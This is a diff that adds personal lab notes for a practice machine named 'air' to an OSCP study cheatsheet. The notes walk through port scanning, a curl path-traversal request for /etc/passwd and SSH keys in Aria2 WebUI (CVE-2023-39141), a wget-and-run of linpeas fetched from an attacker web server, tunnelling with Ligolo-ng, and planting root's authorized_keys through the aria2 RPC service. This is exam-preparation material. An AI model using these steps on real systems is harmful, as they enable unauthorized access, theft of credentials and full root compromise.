@@ -1,4 +1,65 @@
 ### **_OSCP Cheatsheet_**
+machines
+- air
+Recon
+nmap -sT -p- --reason -vvv 192.168.213.100 -oN nmap-air3-tcp.txt
+*rustscan -a $IP --ulimit=5000
+**sudo nmap -Pn -n $IP -sC -sV -p- --open
+port 8888
+aria2filters Cookie
+public exploit cve-2023-39141
+https://www.youtube.com/watch?v=kAFKJWUtN6c
+curl --path-as-is http://localhost:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
+Foothold
+path traversal and /.ssh/id_rsa
+then cut and pasted the id_rsa into to a file on my kali machine
+
+netstat -antup
+PrivEsc
+linpeas
+mkdir /dev/shm/.attack
+cd /dev/shm/.attack
+wget http://<attack Website>/linpeas.sh && chmod 777 linpeas.sh && ./linpeas.sh
+
+ we see the rpc-secret is obfuscated with asterisks, but there must be a startup script or configuration file somewhere on the system that is setting the secret.
+
+ find / -iname aria2* -type f 2>/dev/null
+cat /etc/systemd/system/aria2.service
+
+My first thought was that if I cannot connect to port 6800 from the external network then maybe I can connect to port 6800 from the target’s localhost. To connect to the target’s localhost I would need to setup a tunnel.
+
+My preferred tunneling method is to use Ligolo-ng. 
+
+Setting up Ligolo Tunnel
+If you need to download Ligolo-ng here is the git repository https://github.com/nicocha30/ligolo-ng
+and a here’s great walk-through video https://www.youtube.com/watch?v=DM1B8S80EvQ
+
+
+Privilege Escalation (Continued)
+With the tunnel setup, I went about trying to connect to the internal version of Aria2 WebUi app to the RPC server.
+
+For those using Ligolo-ng you can use the magic IP in your web browser to connect to the internal version of the Aria2 WebUi app: http://240.0.0.1:8888
+
+Once the internal Aria2 WebUi app is opened, go to Settings > Connection Settings. Change the port number to 6800 and enter the secret token we found above.
+
+echo "test" > test.txt
+
+Not only was I able to confirm the file was downloaded, I also discovered the file was owned by root!
+
+Since the file was owned by root I decided to try and make an ssh key pair and attempt to ssh in as root.
+
+On kali I created my ssh key pair and renamed the public key to authorized_keys and set the permissions for root-id_rsa to owner read/write
+
+Note: I named the key pair: root-id_rsa
+
+ssh-keygen -t rsa
+mv root-id_rsa.pub authorized_keys
+chmod 600 root-id_rsa
+
+Following the same steps as before I setup a download for the newly created authorized_keys file to be downloaded the target’s /root/.ssh directory
+
+ssh -i root-id_rsa root@aria2
+
 
 #### Reconnaisance
 
